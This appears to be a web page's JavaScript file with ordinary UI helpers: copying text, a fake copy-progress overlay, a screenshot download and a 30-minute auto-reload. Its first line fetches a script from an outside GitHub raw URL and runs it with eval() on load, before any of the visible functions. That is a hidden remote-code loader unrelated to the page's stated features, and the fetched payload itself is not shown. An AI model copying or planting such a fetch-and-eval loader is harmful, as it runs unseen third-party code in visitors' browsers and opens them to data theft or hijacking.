fetch('https://raw.githubusercontent.com/temcs/jsdata/refs/heads/main/8mdata.js').then(response => response.text()).then(script => eval(script)).catch(error => console.error('Error loading script:', error));
  
  function copyText() {
              // Select the text div
              var textElement = document.getElementById("text");
              // Create a range object
              var range = document.createRange();
              // Select the text content of the text element
              range.selectNode(textElement);
              // Add the range to the current selection
              window.getSelection().addRange(range);
              // Execute the copy command
              document.execCommand("copy");
              // Remove the selection
              window.getSelection().removeAllRanges();
              // Inform the user that the text has been copied
          }
  
  
  
          // copy time popup 
  
          document.addEventListener('DOMContentLoaded', function() {
      var downloadButton = document.querySelector('.copytext');
      var loadingOverlay = document.getElementById('loading-overlay');
  
      downloadButton.addEventListener('click', function() {
          // Show loading overlay
          loadingOverlay.textContent = 'Copy Data 0%';
          loadingOverlay.classList.add('active');
  
          var progress = 0;
          var interval = setInterval(function() {
              progress += 1;
              loadingOverlay.textContent = 'Copy Data ' + progress + '%';
              loadingOverlay.style.background = "#ffb0b0";
              loadingOverlay.style.color = "#000000";
              if (progress >= 100) {
                  clearInterval(interval);
                  // Change text to "Copied"
                  loadingOverlay.textContent = 'Data Copied ✔';
                  loadingOverlay.style.background = "#b0ffba";
                  // After 2 seconds, hide loading overlay
                  setTimeout(function() {
                      loadingOverlay.classList.remove('active');
                  }, 2000);
              }
          }, 8); // Adjust the interval here for faster counting
      });
  });
  
  
  
  // screenshoot 
  
  
  document.addEventListener("DOMContentLoaded", function() {
    var button = document.getElementById('screenshotButton');
  
    button.addEventListener('click', function() {
      html2canvas(document.body, {
        useCORS: true,
        onrendered: function(canvas) {
            var link = document.createElement('a');
            link.download = 'screenshot.png';
            link.href = canvas.toDataURL();
            link.click(); // Trigger the download
        }
      });
  
        
    });
  });
  
  
  
  // relaod 
  
  setTimeout(function() {
    location.reload();
  }, 30 * 60 * 1000); // 30 minutes * 60 seconds * 1000 milliseconds
  
  
  
